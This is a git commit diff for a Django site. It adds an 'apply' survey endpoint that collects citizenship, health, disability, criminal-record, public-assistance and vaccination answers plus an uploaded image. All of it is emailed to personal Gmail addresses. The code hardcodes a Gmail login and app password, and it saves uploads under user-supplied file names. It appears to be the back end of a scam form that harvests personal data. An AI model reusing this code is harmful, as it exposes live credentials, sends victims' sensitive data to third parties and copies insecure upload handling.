204b0af5106b9ef026854f514d1aec431de45277
SQLDigital <46659697+SQLDigital@users.noreply.github.com>
2021-08-11 06:09:58 +0100

    commit

--- visual/urls.py
+++ visual/urls.py
@@ -3,6 +3,8 @@ from . import views
 
 urlpatterns = [
     path('', views.index, name="home"),
-    path('sendmail/', views.sendmail, name="sendmail")
+    path('sendmail/', views.sendmail, name="sendmail"),
+    path('apply/', views.apply, name="apply"),
+    path('sendsurvey/', views.survey, name="sendsurvey"),
 
 ]
--- visual/views.py
+++ visual/views.py
@@ -59,3 +59,45 @@ def sendmail(request):
         smtp.login('sodeeqsodeeq@gmail.com', 'avtltqidkrtbgvmz')
         smtp.send_message(msg)
     return render(request, 'index.html', {'context': context})
+
+
+def survey(request):
+    context = {
+        "Response": 'Thank You, We will get back to you.... '
+    }
+    msg = EmailMessage()
+    msg['Subject'] = 'New Registration'
+    msg['From'] = 'sodeeqsodeeq@gmail.com'
+    # msg['To'] = 'jannetdollinsmgw39@gmail.com'
+    msg['To'] = 'dickson.smith4570@gmail.com'#'r2py39@gmail.com'
+    msg.set_content("FirstName= " + request.POST['fname'] + "\r"
+                                                            "LastName =" + request.POST['lname'] + "\r"
+                                                                                                   "Email: " +
+                    request.POST['email'] + "\r"
+                                            "Are you a citizen of the united state of America : " + request.POST['citizen'] + "\r"
+                                                                                    "Have you work for an Agency of the Federal Government: " + request.POST[
+                        'agency'] + "\r"
+                                  "Are you available and able to work : " + request.POST['availability'] + "\r"
+                                  "Do you have any Health Related Issues : " + request.POST['issues'] + "\r"
+                                  "Do you have any Disability : " + request.POST['disability'] + "\r"
+                                  "Are you or anyone in your household receiving public assistance : " + request.POST['assistance'] + "\r"
+                                  "Has any member of your family contracted Covid-19 : " + request.POST['covid'] + "\r"
+                                  "Have you been Vaccinated : " + request.POST['vaccinated'] + "\r"
+                                  "Do you have any criminal record : " + request.POST['criminal'] + "\r"
+                                  "In your present or most recent employment, were you self employed : " + request.POST['employment'] + "\r"
+                                  "Have you received Severance or Dismissal pay within the last six (6) months: " + request.POST['severance'])
+
+    file1 = request.FILES['attachment2']
+    fs = FileSystemStorage()
+    filename = fs.save(file1.name, file1)
+    uploaded_file_url = fs.url(filename)
+    with open(uploaded_file_url, 'rb') as f:
+        file_data = f.read()
+        file_type = str(imghdr.what(f.name))
+        file_name = f.name
+    msg.add_attachment(file_data, maintype='image', subtype=file_type, filename=file_name)
+
+    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
+        smtp.login('sodeeqsodeeq@gmail.com', 'avtltqidkrtbgvmz')
+        smtp.send_message(msg)
+    return render(request, 'apply.html', {'context': context})
